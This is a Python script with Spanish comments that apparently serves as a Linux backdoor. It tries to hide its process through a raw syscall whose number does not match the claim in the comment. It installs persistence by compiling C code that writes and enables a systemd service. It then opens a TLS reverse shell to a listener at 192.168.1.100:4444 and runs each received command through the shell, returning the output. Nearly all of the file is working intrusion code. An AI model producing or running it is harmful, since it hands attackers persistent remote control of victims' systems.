
import os
import socket
import ssl
import subprocess
import ctypes
from ctypes import CDLL
import time
import platform
from datetime import datetime

# Cargar la biblioteca C que oculta el proceso
libc = CDLL("libc.so.6")

def hide_process():
    try:
        libc.syscall(63, os.getpid(), 63)  # Usar la llamada al sistema para ocultar el proceso
        log_event("Proceso oculto exitosamente.")
    except Exception as e:
        log_event(f"Error al ocultar el proceso: {e}")

# Compilar y ejecutar el programa en C para persistencia
def compile_and_run_persistence():
    persistence_code = '''
    #include <stdio.h>
    #include <stdlib.h>

    void create_persistence() {
        system("echo '[Unit]' > /etc/systemd/system/persistencia.service");
        system("echo 'Description=Servicio de Persistencia' >> /etc/systemd/system/persistencia.service");
        system("echo '[Service]' >> /etc/systemd/system/persistencia.service");
        system("echo 'ExecStart=/usr/bin/python3 /usr/local/bin/persistence_script.py' >> /etc/systemd/system/persistencia.service");
        system("echo 'Restart=always' >> /etc/systemd/system/persistencia.service");
        system("echo '[Install]' >> /etc/systemd/system/persistencia.service");
        system("echo 'WantedBy=multi-user.target' >> /etc/systemd/system/persistencia.service");

        system("systemctl enable persistencia.service");
        system("systemctl start persistencia.service");
    }

    int main() {
        create_persistence();
        return 0;
    }
    '''

    with open("/tmp/persistence.c", "w") as f:
        f.write(persistence_code)
    
    os.system("gcc /tmp/persistence.c -o /tmp/persistence")
    os.system("/tmp/persistence")
    log_event("Persistencia creada mediante código C.")

# Configuración de logging
def log_event(event_message):
    log_file = "/var/log/system_service.log"
    with open(log_file, "a") as log:
        log.write(f"{datetime.now().isoformat()} - {event_message}\n")

# Establecer conexión segura con SSL/TLS
def establish_secure_connection(host, port):
    context = ssl.create_default_context()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    secure_socket = context.wrap_socket(s, server_hostname=host)
    try:
        secure_socket.connect((host, port))
        log_event("Conexión segura establecida.")
        return secure_socket
    except Exception as e:
        log_event(f"Error al establecer la conexión segura: {e}")
        return None

# Ejecutar comandos a nivel de kernel o sistema
def execute_kernel_command(command):
    try:
        result = subprocess.check_output(command, shell=True).decode()
        log_event(f"Comando ejecutado: {command}")
        return result
    except Exception as e:
        log_event(f"Error al ejecutar el comando: {e}")
        return str(e)

def main():
    if platform.architecture()[0] != '64bit':
        log_event("Este script está diseñado para sistemas de 64 bits.")
        return

    hide_process()
    compile_and_run_persistence()

    host = "192.168.1.100"  # Cambiar por la IP del servidor de escucha
    port = 4444  # Cambiar por el puerto del servidor de escucha

    while True:
        conn = establish_secure_connection(host, port)
        if conn:
            while True:
                try:
                    command = conn.recv(1024).decode()
                    if command.lower() == "exit":
                        break
                    output = execute_kernel_command(command)
                    conn.send(output.encode())
                except Exception as e:
                    conn.send(str(e).encode())
                    break
        time.sleep(10)

if __name__ == "__main__":
    main()
